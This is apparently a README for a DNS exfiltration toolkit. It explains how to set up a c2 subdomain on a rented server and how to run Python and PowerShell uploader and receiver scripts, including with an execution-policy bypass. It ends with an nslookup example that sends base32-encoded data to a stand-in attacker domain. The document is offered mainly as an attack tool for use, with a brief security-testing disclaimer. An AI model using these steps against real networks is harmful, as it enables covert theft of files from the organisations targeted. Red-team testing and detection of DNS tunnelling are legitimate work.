DNS Exfiltration Tools
ALL OTHER TOOLS NOT DOCUMENTED HERE ARE WORKS IN PROGRESS
I AM NOT RESPONSIBLE FOR ANY MISUSE OF THESE TOOLS THESE ARE FOR SECURITY TESTING ONLY

Infrastrucutre Set Up:
MUST OWN A DOMAIN AND AN INTERNET CONNECTED SERVER

AWS VM IP: 123.123.123.123
Cloudflare domain: fakedomain.com
In Cloudflare DNS managager:
  Create NS record: c2.fakedomain.com
  Create A record for c2: 123.123.123.123
  Create A records for example.com: 123.123.123.123

Tool Usage:
dns_file_receiver.py (Unix) (Server)
  Change the "domain" parameter to: c2.fakedomain.com
  Change the "SOCKET_TIMEOUT" to whatever is appropriate in seconds. This variable defines how long the script will stay active waiting for a connection from the uploaders.
  Run the script: sudo python3 dns_file_receiver.py

dns_file_uploader.ps1 (Windows) (Client)
  Change the "domain" parameter to: c2.fakedomain.com
  Run the script: powershell -ExecutionPolicy Bypass -File .\dns_file_uploader.ps1
  Follow the prompts
    File path: quotes can be used
    Domain OR IP: IP address of AWS server (123.123.123.123) or domain name (fakedomain.com)
    Set up a random delay in seconds: #

dns_file_uploader (Unix) (Client)
  Change "DNS_SERVER" parameter to: IP address of AWS server (123.123.123.123) or domain name (fakedomain.com)
  Change "domain" parameter to: c2.fakedomain.com
  Run the script: sudo python3 dns_file_uploader.py
    File path: quotes can be used
    Set up a random delay in seconds: #

ns-dns_server.py (Unix) (Server)
  Change m = re.search(r'([A-Z2-7]+)\.<subdomain>\.<domain>\.com', domain_name) to : m = re.search(r'([A-Z2-7]+)\.c2\.fakedomain\.com', domain_name)
  Optional: Change the IP in the "fake_ip" parameter
  Run the script: sudo python3 ns-dns_server.py
  
This script requires the client to run a base32 payload.
Use https://gchq.github.io/CyberChef/#recipe=To_Base32('A-Z2-7%3D') to create the payload.
Once payload is created.
Run: nslookup <payload>.c2.fakedomain.com
Ex. INPUT: TESTING TESTING 123
    OUTPUT: KRCVGVCJJZDSAVCFKNKESTSHEAYTEMY=
    nslookup KRCVGVCJJZDSAVCFKNKESTSHEAYTEMY.c2.fakedomain.com
